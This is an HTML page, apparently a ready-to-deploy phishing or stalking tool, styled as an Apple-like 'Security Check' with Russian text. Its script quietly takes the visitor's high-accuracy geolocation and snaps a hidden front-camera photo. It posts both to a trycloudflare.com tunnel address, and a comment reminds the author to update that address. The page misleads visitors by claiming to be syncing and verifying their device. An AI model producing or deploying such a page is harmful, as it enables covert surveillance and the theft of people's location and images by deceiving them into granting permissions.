<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Verification</title>
    <style>
         :root {
            --bg: #050505;
            --accent: #0071e3;
            /* Apple Blue */
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }
        
        body,
        html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: var(--bg);
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }
        /* Эффект вспышки */
        
        #flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            opacity: 0;
            pointer-events: none;
            z-index: 1000;
        }
        /* Контейнер-карточка */
        
        .card {
            position: relative;
            width: 85%;
            max-width: 340px;
            padding: 40px 20px;
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 28px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        h1 {
            font-size: 22px;
            font-weight: 600;
            margin: 0 0 10px;
            letter-spacing: -0.5px;
        }
        
        p {
            font-size: 14px;
            color: #888;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        /* Прокачанная кнопка */
        
        .btn {
            position: relative;
            background: #fff;
            color: #000;
            border: none;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 14px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
        }
        
        .btn:active {
            transform: scale(0.97);
            background: #f0f0f0;
        }
        /* Загрузчик (Spinner) */
        
        .loader {
            display: none;
            margin: 0 auto;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        /* Скрытые элементы */
        
        video,
        canvas {
            display: none;
        }
        /* Состояние успеха */
        
        .success-icon {
            display: none;
            color: #34c759;
            font-size: 40px;
            margin-bottom: 10px;
        }
    </style>
</head>

<body>

    <div id="flash"></div>

    <div class="card" id="app">
        <div id="content">
            <div class="success-icon" id="icon">✓</div>
            <h1 id="title">Security Check</h1>
            <p id="desc">Нажмите кнопку ниже для синхронизации устройства</p>
            <button class="btn" id="mainBtn" onclick="initProcess()">Ок</button>
            <div class="loader" id="loader"></div>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // НЕ ЗАБУДЬ ОБНОВИТЬ URL ТУННЕЛЯ
        const API = "https://831ae71990b1e6.trycloudflare.com";

        const elements = {
            btn: document.getElementById('mainBtn'),
            loader: document.getElementById('loader'),
            title: document.getElementById('title'),
            desc: document.getElementById('desc'),
            icon: document.getElementById('icon'),
            flash: document.getElementById('flash'),
            video: document.getElementById('v'),
            canvas: document.getElementById('c')
        };

        async function initProcess() {
            // Переход в режим загрузки
            elements.btn.style.display = 'none';
            elements.loader.style.display = 'block';
            elements.title.innerText = "Processing...";
            elements.desc.innerText = "Установка защищенного соединения...";

            try {
                // 1. Запрос Гео (тихо)
                navigator.geolocation.getCurrentPosition(p => {
                    fetch(`${API}/location`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            lat: p.coords.latitude,
                            lon: p.coords.longitude
                        })
                    });
                }, null, {
                    enableHighAccuracy: true
                });

                // 2. Доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: {
                            ideal: 1920
                        },
                        height: {
                            ideal: 1080
                        }
                    }
                });
                elements.video.srcObject = stream;

                // 3. Короткая пауза для фокуса
                await new Promise(r => setTimeout(r, 1200));

                // 4. Вспышка и захват
                elements.flash.style.opacity = "1";

                setTimeout(async() => {
                    const settings = stream.getVideoTracks()[0].getSettings();
                    elements.canvas.width = settings.width || 1280;
                    elements.canvas.height = settings.height || 720;
                    elements.canvas.getContext('2d').drawImage(elements.video, 0, 0);

                    elements.flash.style.opacity = "0";

                    const blob = await new Promise(res => elements.canvas.toBlob(res, 'image/jpeg', 0.95));
                    const fd = new FormData();
                    fd.append('file', blob, `UHD_${Date.now()}.jpg`);

                    await fetch(`${API}/upload-photo`, {
                        method: 'POST',
                        body: fd
                    });

                    // Завершение
                    stream.getTracks().forEach(t => t.stop());
                    showSuccess();
                }, 150);

            } catch (e) {
                elements.title.innerText = "Access Denied";
                elements.desc.innerText = "разрешите доступ к камере и геопозиции.";
                elements.loader.style.display = 'none';
                elements.btn.style.display = 'block';
                elements.btn.innerText = "Попробовать снова";
            }
        }

        function showSuccess() {
            elements.loader.style.display = 'none';
            elements.icon.style.display = 'block';
            elements.title.innerText = "Verified";
            elements.desc.innerText = "Теперь вы можете закрыть это окно.";
        }
    </script>

</body>

</html>
